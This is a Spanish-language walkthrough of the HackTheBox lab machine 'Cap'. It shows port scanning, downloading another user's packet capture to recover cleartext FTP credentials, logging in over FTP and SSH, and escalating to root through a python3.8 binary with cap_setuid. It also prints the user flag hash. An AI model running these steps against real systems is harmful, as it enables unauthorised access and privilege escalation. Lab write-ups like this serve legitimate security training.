# Cap — HackTheBox WriteUp

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.31.133
nmap -sCV -p21,22,80 10.129.31.133
```

**Puertos abiertos:**
- `21/tcp` — FTP (vsftpd 3.0.3)
- `22/tcp` — SSH (OpenSSH 8.2p1)
- `80/tcp` — HTTP (Gunicorn — "Security Dashboard")

## Enumeración Web

El sitio web en el puerto 80 es un "Security Dashboard" con las siguientes rutas:

- `/` — Dashboard principal
- `/capture` — Security Snapshot (captura de red de 5 segundos)
- `/ip` — Configuración IP
- `/netstat` — Estado de red

Al visitar `/capture` redirige a `/data/1` que muestra un análisis de paquetes y un botón para descargar el PCAP en `/download/1`.

## Captura de tráfico (PCAP)

Probamos distintos IDs de captura:

```bash
curl -s http://10.129.31.133/download/0 -o capture0.pcap
curl -s http://10.129.31.133/download/1 -o capture1.pcap
```

Analizando `capture0.pcap` encontramos credenciales FTP en texto claro:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

## Acceso FTP y user.txt

```bash
curl -u nathan:Buck3tH4TF0RM3! ftp://10.129.31.133/
curl -u nathan:Buck3tH4TF0RM3! ftp://10.129.31.133/user.txt
```

**user.txt:** `1b3e502b1c9fed32bb75d307194f53b4`

## Acceso SSH

```bash
ssh nathan@10.129.31.133
Password: Buck3tH4TF0RM3!
```

## Escalada de privilegios (nathan → root)

Enumeración de capacidades:

```bash
getcap -r / 2>/dev/null
```

Salida relevante:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`python3.8` tiene `cap_setuid`, lo que permite cambiar el UID a 0 (root):

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
cat /root/root.txt
```

**root.txt:** `<flag de root>`
